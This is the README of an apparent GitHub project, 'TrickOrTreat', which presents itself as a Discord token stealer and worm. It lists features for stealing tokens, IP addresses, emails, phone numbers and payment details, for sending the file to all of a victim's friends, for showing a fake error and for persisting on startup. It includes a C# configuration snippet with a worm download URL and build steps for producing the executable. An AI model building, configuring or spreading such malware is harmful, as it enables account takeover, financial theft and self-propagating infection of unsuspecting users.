# TrickOrTreat
A new Discord token stealer/worm that can spread itself.

<p align="center">
<img src="https://img.shields.io/github/languages/top/extatent/TrickOrTreat?style=flat-square" </a>
<img src="https://img.shields.io/github/last-commit/extatent/TrickOrTreat?style=flat-square" </a>
<img src="https://img.shields.io/github/license/extatent/TrickOrTreat?style=flat-square" </a>
<img src="https://img.shields.io/github/stars/extatent/TrickOrTreat?color=%23daff00&label=Stars&style=flat-square" </a>
<img src="https://img.shields.io/github/forks/extatent/TrickOrTreat?color=%23daff00&label=Forks&style=flat-square" </a>

---

**NOTE:** ⭐ If you like the project, feel free to star it ⭐
  
### Most likely I won't add new features, if you want to do so, fork the project. This is just an example of how the new token encryption works and a way to spread.

#### Features:
- Classic Mode (Sends only the Discord token and IP address in an non-embedded format.)
- Spread Mode (Sends the file/message to all friends.)
- Fake Error (Throws a fake error after opening the program.)
- Run On Startup (Runs the program once the computer is started.)
- Sends Discord Embeds
- Getting the user's information (Discord Token, IP Address, Phone Number, Email, Payment Info and many more)

### Configurations
```csharp
static bool ClassicMode = false; // Sends only the Discord token and IP address in an non-embedded format. (true/false)
static bool SpreadMode = false; // Sends the file/message to all friends (true/false)
static string WormURL = "https://example.com/cool.exe"; // Enter the download link you want the user to download and spread
static string WormMessage = ""; // Enter the message (optional)
static bool FakeError = false; // Throws a fake error after opening the program (true/false)
static bool RunOnStartup = false; // Runs the program once the computer is started (true/false)
```
**NOTE:** These settings can be found in the program.cs file.
  
<details>
<summary>Preview</summary>
<img src="https://i.imgur.com/o50kz9w.png" alt="png">

<img src="https://i.imgur.com/KV9nmoE.png" alt="png">
</details>

## Installation
  
>Click the green "Code" button. 
  
>Click "Download ZIP".
  
>Extract the ZIP.

>Open the TrickOrTreat.sln, in Visual Studio go to Program.cs and edit your webhook with the settings then head to Build>Build Solution
  
>Go to bin>debug folder to get the executable.

>NOTE: Make sure you have [Visual Studio 2019 or Visual Studio 2022](https://visualstudio.microsoft.com/downloads/) and [.NET Framework 4.8](https://dotnet.microsoft.com/en-us/download/dotnet-framework) installed.

---
### TrickOrTreat is licensed under the GNU General Public License v3.0. See the [LICENSE](https://github.com/extatent/TrickOrTreat/blob/main/LICENSE) file for details.
